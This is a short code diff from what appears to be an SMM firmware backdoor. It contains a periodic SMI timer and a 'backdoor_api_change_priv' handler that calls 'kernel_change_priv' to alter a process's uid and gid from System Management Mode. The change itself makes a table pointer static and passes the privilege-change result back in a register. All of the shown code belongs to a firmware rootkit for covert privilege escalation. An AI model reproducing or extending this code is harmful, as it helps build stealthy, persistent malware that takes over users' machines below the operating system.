@@ -18,7 +18,7 @@
 static UINT64 gSmiInterval = 640000;
 static UINT64 gBackdoorWakeupPeriod = 1000000;
 
-EFI_SMM_SYSTEM_TABLE* gStmt;
+static EFI_SMM_SYSTEM_TABLE* gStmt;
 static EFI_SMM_BASE_PROTOCOL* gSmmBase;
 static EFI_SMM_SW_DISPATCH_PROTOCOL* gSwDispatch;
 static EFI_SMM_PERIODIC_TIMER_DISPATCH_PROTOCOL* gPeriodicTimer;
@@ -96,7 +96,7 @@ static void backdoor_api_change_priv(struct BackdoorParams* params, UINT32 cpu) 
         UINT32 gid = params->r[2];
 
         backdoor_save_control_regs(cpu);
-        kernel_change_priv(uid, gid, params);
+        params->r[0] = kernel_change_priv(uid, gid);
     } else {
         params->r[0] = EFI_INVALID_PARAMETER;
     }
